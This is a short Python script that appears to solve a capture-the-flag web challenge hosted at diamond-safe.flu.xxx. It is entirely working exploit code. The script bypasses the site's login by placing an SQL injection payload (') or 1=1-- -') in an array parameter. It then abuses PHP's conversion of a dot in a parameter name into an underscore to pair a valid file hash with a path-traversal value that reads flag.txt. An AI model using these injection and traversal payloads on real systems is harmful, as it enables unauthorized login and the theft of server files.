#!/usr/bin/python3
import requests
import re

url = "https://diamond-safe.flu.xxx"

def bypass_login(session) -> bool:
	data = {
		"password": "%s",
		"name[]": [") or 1=1-- -", "anything"]
	}

	resp = session.post(url + "/login.php", data=data)
	
	if  "Welcome to your vault!" in resp.text:
		return True

def get_flag(session) -> str:
	params = {
		"h": "95f0dc5903ee9796c3503d2be76ad159",
		"file_name": "Diamond.txt",
		"file.name": "../../../../../../../flag.txt" # . => _
	}

	resp = session.get(url + "/download.php", params=params)

	flag = re.findall(r'flag{(.*)}', resp.text)[0]
	return "flag{" + flag + "}"

if __name__ == "__main__":
	r = requests.Session()
	assert bypass_login(r) == True

	print("[+] Login successfull!")

	flag = get_flag(r)

	print("[+] Your flag: " + flag)
